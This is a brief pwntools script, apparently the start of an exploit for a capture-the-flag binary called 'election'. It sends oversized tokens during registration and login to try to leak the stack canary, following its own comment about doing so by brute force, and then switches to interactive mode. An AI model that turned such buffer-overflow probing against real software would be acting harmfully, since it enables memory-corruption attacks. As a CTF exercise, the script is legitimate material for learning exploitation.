from pwn import *

context.arch = 'amd64'

r = process('./election', env={"LD_PRELOAD" : "./libc.so"})

# leak canary bruteforcely
r.sendlineafter('>', '2') # register
r.sendlineafter('Register an anonymous token: ', 'a' * 0xb8)
r.sendlineafter('>', '1') # login
r.sendlineafter('Token: ', 'a' * 0xb7) 


r.interactive()

